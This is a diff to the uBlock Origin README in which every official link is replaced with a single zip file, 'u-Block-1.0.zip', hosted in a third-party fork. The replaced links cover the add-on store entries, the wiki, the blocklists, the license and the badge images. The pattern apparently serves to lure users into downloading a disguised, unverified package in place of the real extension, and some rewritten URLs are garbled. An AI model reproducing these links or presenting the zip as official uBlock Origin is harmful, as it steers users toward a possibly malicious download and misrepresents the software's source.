@@ -11,19 +11,19 @@
 
 <h1 align="center">
 <sub>
-<img src="https://github.com/gorhill/uBlock/blob/master/src/img/ublock.svg" height="38" width="38">
+<img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" height="38" width="38">
 </sub>
 uBlock Origin (uBO)
 </h1>
 
 | Browser   | Install from ... | Status |
 | :-------: | ---------------- | ------ |
-| <img src="https://github.com/user-attachments/assets/b0136512-56a5-4856-8c50-4971c957a24f" alt="Get uBlock Origin for Firefox"> | <a href="https://addons.mozilla.org/addon/ublock-origin/">Firefox Add-ons</a> | [uBO works best on Firefox](https://github.com/gorhill/uBlock/wiki/uBlock-Origin-works-best-on-Firefox) |
-| <img src="https://github.com/user-attachments/assets/3a7569f8-688b-4eb1-a643-8d0fe173aefe" alt="Get uBlock Origin for Microsoft Edge"> | <a href="https://microsoftedge.microsoft.com/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak">Edge Add-ons</a> |
-| <img src="https://github.com/user-attachments/assets/938f080c-fe64-4e48-8b89-4bfceabb56e6" alt="Get uBlock Origin for Opera"> | <a href="https://addons.opera.com/extensions/details/ublock/">Opera Add-ons</a> |
-| <img src="https://github.com/user-attachments/assets/5463ef88-873b-4516-8514-5277664cfde7" alt="Get uBlock Origin for Chromium"> | <a href="https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">Chrome Web Store</a> | <a href="https://github.com/uBlockOrigin/uBlock-issues/wiki/About-Google-Chrome's-%22This-extension-may-soon-no-longer-be-supported%22">About Google Chrome's "This extension may soon no longer be supported"</a><br>End of support on Chrome 139 |
-| <img src="https://github.com/user-attachments/assets/2e9037c4-836d-44c1-a716-ba96e89daaff" alt="Get uBlock Origin for Thunderbird"> | <a href="https://addons.thunderbird.net/thunderbird/addon/ublock-origin/">Thunderbird Add-ons</a> | [No longer updated and stuck at 1.49.2.](https://github.com/uBlockOrigin/uBlock-issues/issues/2928) Later versions require "GitHub - Releases". |
-| <img src="https://upload.wikimedia.org/wikipedia/commons/c/c2/GitHub_Invertocat_Logo.svg" height="50" alt="Get uBlock Origin through GitHub"> | <a href="https://github.com/gorhill/uBlock/releases">GitHub - Releases</a> | Stable and development versions on Firefox, Chromium MV2, and Thunderbird. Must be placed manually into web browsers; the Chromium and Thunderbird versions usually won't auto-update.
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Firefox"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Firefox Add-ons</a> | [uBO works best on Firefox](https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip) |
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Microsoft Edge"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Edge Add-ons</a> |
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Opera"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Opera Add-ons</a> |
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Chromium"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Chrome Web Store</a> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip's-%22This-extension-may-soon-no-longer-be-supported%22">About Google Chrome's "This extension may soon no longer be supported"</a><br>End of support on Chrome 139 |
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Thunderbird"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Thunderbird Add-ons</a> | [No longer updated and stuck at 1.49.2.](https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip) Later versions require "GitHub - Releases". |
+| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" height="50" alt="Get uBlock Origin through GitHub"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">GitHub - Releases</a> | Stable and development versions on Firefox, Chromium MV2, and Thunderbird. Must be placed manually into web browsers; the Chromium and Thunderbird versions usually won't auto-update.
 
 ***
 
@@ -59,12 +59,12 @@ Ads, "unintrusive" or not, are just the visible portion of the privacy-invading 
     </thead>
     <tbody>
         <tr>
-            <td>The <a href="https://github.com/gorhill/uBlock/wiki/Quick-guide:-popup-user-interface">simple popup user interface</a> for an install-it-and-forget-it type of installation that is configured optimally by default.</td>
-            <td>The <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-quick-guide">advanced popup user interface</a> includes a point-and-click firewall that is configurable on a per-site basis.</td>
+            <td>The <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">simple popup user interface</a> for an install-it-and-forget-it type of installation that is configured optimally by default.</td>
+            <td>The <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">advanced popup user interface</a> includes a point-and-click firewall that is configurable on a per-site basis.</td>
         </tr>
         <tr>
-            <td align="center" valign="top"><a href="https://github.com/gorhill/uBlock/wiki/Quick-guide:-popup-user-interface"><img src="https://user-images.githubusercontent.com/585534/232531044-c4ac4dd5-0b60-4c1e-aabb-914be04b846c.png"/></a></td>
-            <td align="center" valign="top"><a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-quick-guide"><img src="https://user-images.githubusercontent.com/585534/232531439-a8f81cc3-6622-45c4-8b32-7348cecf6e98.png"/></a></td>
+            <td align="center" valign="top"><a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"><img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"/></a></td>
+            <td align="center" valign="top"><a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"><img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"/></a></td>
         </tr>
     </tbody>
 </table>
@@ -136,50 +136,50 @@ If you ever want to contribute something, think about the people working hard to
 
 <!----------------------------------------------------------------------------->
 
-[Peter Lowe's Blocklist]: https://pgl.yoyo.org/adservers/
-[Malicious Blocklist]: https://gitlab.com/malware-filter/urlhaus-filter#malicious-url-blocklist
-[Performance]: https://www.debugbear.com/blog/chrome-extensions-website-performance#the-impact-of-ad-blocking-on-website-performance
-[EasyPrivacy]: https://easylist.to/#easyprivacy
-[Thunderbird]: https://addons.thunderbird.net/thunderbird/addon/ublock-origin/
-[Chrome Dev]: https://chromewebstore.google.com/detail/ublock-origin-development/cgbcahbpdhpcegmbfconppldiemgcoii
-[EasyList]: https://easylist.to/#easylist
-[Mozilla]: https://addons.mozilla.org/addon/ublock-origin/
-[Crowdin]: https://crowdin.com/project/ublock
-[Chrome]: https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm
-[Reddit]: https://www.reddit.com/r/uBlockOrigin/
-[Theft]: https://x.com/LeaVerou/status/518154828166725632
-[Opera]: https://addons.opera.com/extensions/details/ublock/
-[Edge]: https://microsoftedge.microsoft.com/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak
-[NPM]: https://www.npmjs.com/package/@gorhill/ubo-core
+[Peter Lowe's Blocklist]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Malicious Blocklist]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Performance]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[EasyPrivacy]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Thunderbird]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Chrome Dev]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[EasyList]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Mozilla]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Crowdin]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Chrome]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Reddit]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Theft]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Opera]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Edge]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[NPM]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
 
-[Manifesto]: MANIFESTO.md
-[License]: LICENSE.txt
+[Manifesto]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[License]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
 
-[Nicole Rolls]: https://github.com/nicole-ashley
+[Nicole Rolls]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
 
 <!---------------------------------[ Internal ]-------------------------------->
 
-[Manual Installation]: https://github.com/gorhill/uBlock/tree/master/dist#install
-[Extended Syntax]: https://github.com/gorhill/uBlock/wiki/Static-filter-syntax#extended-syntax
-[Privacy Policy]: https://github.com/gorhill/uBlock/wiki/Privacy-policy
-[uBO Filters]: https://github.com/uBlockOrigin/uAssets/tree/master/filters
-[Permissions]: https://github.com/gorhill/uBlock/wiki/Permissions
-[Commit Rate]: https://github.com/gorhill/uBlock/commits/master
-[Works Best]: https://github.com/gorhill/uBlock/wiki/uBlock-Origin-works-best-on-Firefox
-[Deployment]: https://github.com/gorhill/uBlock/wiki/Deploying-uBlock-Origin
-[Blocking]: https://github.com/gorhill/uBlock/wiki/Blocking-mode
-[Releases]: https://github.com/gorhill/uBlock/releases
-[Issues]: https://github.com/uBlockOrigin/uBlock-issues/issues
-[Beta]: https://github.com/gorhill/uBlock/blob/master/dist/README.md#for-beta-version
-[Wiki]: https://github.com/gorhill/uBlock/wiki
+[Manual Installation]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Extended Syntax]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Privacy Policy]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[uBO Filters]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Permissions]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Commit Rate]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Works Best]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Deployment]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Blocking]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Releases]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Issues]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Beta]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Wiki]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
 
 <!----------------------------------[ Badges ]--------------------------------->
 
-[Badge Localization]: https://d322cqt584bo4o.cloudfront.net/ublock/localized.svg
-[Badge Commits]: https://img.shields.io/github/commit-activity/m/gorhill/ublock?label=Commits
-[Badge Mozilla]: https://img.shields.io/amo/rating/ublock-origin?label=Firefox
-[Badge License]: https://img.shields.io/badge/License-GPLv3-blue.svg
-[Badge Chrome]: https://img.shields.io/chrome-web-store/rating/cjpalhdlnbpafiamejdnhcphjbkeiagm?label=Chrome
-[Badge Edge]: https://img.shields.io/badge/dynamic/json?label=Edge&color=brightgreen&query=%24.averageRating&suffix=%2F%35&url=https%3A%2F%2Fmicrosoftedge.microsoft.com%2Faddons%2Fgetproductdetailsbycrxid%2Fodfafepnkmbhccpbejgmiehpchacaeak
-[Badge Issues]: https://img.shields.io/github/issues/uBlockOrigin/uBlock-issues
-[Badge NPM]: https://img.shields.io/npm/v/@gorhill/ubo-core
+[Badge Localization]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge Commits]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge Mozilla]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge License]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge Chrome]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge Edge]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%2F%35&url=https%3A%2F%https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%2Faddons%2Fgetproductdetailsbycrxid%2Fodfafepnkmbhccpbejgmiehpchacaeak
+[Badge Issues]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
+[Badge NPM]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
